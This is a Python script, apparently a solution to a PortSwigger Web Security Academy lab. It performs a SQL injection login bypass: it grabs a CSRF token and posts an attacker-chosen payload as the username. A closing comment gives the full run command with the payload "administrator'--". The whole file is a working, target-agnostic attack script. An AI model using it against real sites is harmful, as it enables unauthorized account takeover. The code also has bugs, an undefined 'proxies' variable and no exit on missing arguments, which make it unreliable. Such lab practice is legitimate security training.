from variables import constants
import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=constants.proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf


def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}

    r = s.post(url, data=data, verify=False, proxies=proxies)
    res = r.text
    if "Log out" in res:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        sqli_payload = sys.argv[2].strip()
    except IndexError:
        print('[-] Usage: %s <url> <sql-payload>' % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])

    s = requests.Session()

    if exploit_sqli(s, url, sqli_payload):
        print(
            '[+] SQL injection successful! We have logged in as the administrator user.')
    else:
        print('[-] SQL injection unsuccessful.')

# bash command to trigger the attack: python3 sql-injection/test-02/test-02.py https://0a67001e03d829c180a3808600d90006.web-security-academy.net/login "administrator'--"
# Note that the URL can be different and updates on daily basis by the PortSwigger
